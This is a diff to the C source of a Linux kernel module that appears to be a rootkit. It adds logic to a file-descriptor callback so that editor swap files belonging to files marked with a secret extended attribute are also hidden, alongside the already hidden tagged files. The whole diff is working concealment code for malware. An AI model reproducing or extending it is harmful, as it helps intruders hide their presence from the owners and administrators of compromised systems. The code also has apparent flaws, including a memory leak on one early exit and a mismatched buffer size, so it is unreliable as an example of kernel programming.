@@ -1,9 +1,12 @@
 #include <linux/slab.h>
 #include <linux/fd.h>
+#include <linux/fs.h>
 #include <linux/pid.h>
 #include <linux/sched.h>
 #include <linux/fdtable.h>
+#include <linux/dcache.h>
 #include <linux/xattr.h>
+#include <linux/namei.h>
 
 #include "common.h"
 #include "hook.h"
@@ -74,15 +77,59 @@ int
 fd_callback(const void *ptr, struct file *f, unsigned fd)
 {
     struct inode *inode = f->f_inode;
-    char buf[512];
+    char *buf = kzalloc(BUFLEN, GFP_KERNEL);
 
     if(!inode_permission(inode, MAY_READ)) {
         ssize_t len = vfs_getxattr(f->f_path.dentry, G7_XATTR_NAME, buf, BUFLEN);
 
-        if (len > 0 && !strncmp(G7_XATTR_VAL, buf, strlen(G7_XATTR_VAL)))
+        if(len > 0 && !strncmp(G7_XATTR_VAL, buf, strlen(G7_XATTR_VAL))) {
             add_fd_to_list(&hidden_fds, (int) fd);
+            goto leave;
+        }
+
+        const char *fname = f->f_path.dentry->d_name.name;
+
+        if(strlen(fname) >= 6) {
+            char *abs = kzalloc(BUFLEN, GFP_KERNEL);
+
+            if(strncmp(fname, ".", 1) || strncmp((fname + (strlen(fname) - 4)), ".swp", 4)) {
+                goto leave;
+            }
+
+
+            memset(buf, 0, BUFLEN);
+            strncpy(buf, (fname + 1), strlen(fname) - 5);
+
+            char *path = d_path(&f->f_path, abs, 512);
+
+            if(IS_ERR(path))
+                goto end;
+
+            memset((path + (strlen(path) - strlen(fname))), 0, strlen(fname));
+            strcat(path, buf);
+
+            struct path path_struct;
+            if(kern_path(path, LOOKUP_FOLLOW, &path_struct))
+                goto end;
+
+            memset(buf, 0, BUFLEN);
+
+            ssize_t len = vfs_getxattr(path_struct.dentry, G7_XATTR_NAME, buf, BUFLEN);
+
+            if(len > 0 && !strncmp(G7_XATTR_VAL, buf, strlen(G7_XATTR_VAL))) {
+                add_fd_to_list(&hidden_fds, (int) fd);
+            }
+
+            end:
+            kfree(abs);
+            goto leave;
+
+        }
     }
 
+    leave:
+    kfree(buf);
+    
     return 0;
 }
 
